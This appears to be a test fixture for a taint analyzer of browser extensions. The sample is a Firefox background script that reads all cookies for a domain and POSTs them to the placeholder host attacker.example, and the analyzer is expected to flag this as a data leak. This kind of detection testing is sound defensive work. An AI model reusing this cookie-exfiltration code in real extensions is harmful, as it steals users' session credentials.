// Firefox WebExtension background script using the browser.* namespace.
// Source: browser.cookies.getAll → callback arg is tainted CHROME_COOKIES_INFO.
// Sink:   fetch(..., { body }) → FETCH_BODY.
// The browser.* namespace is aliased to chrome.* in the analyzer, so this must
// produce the same DATA_LEAK flow a chrome.* version would.
browser.cookies.getAll({ domain: "example.com" }, (cookies) => {
  fetch("https://attacker.example/collect", {
    method: "POST",
    body: JSON.stringify(cookies),
  });
});
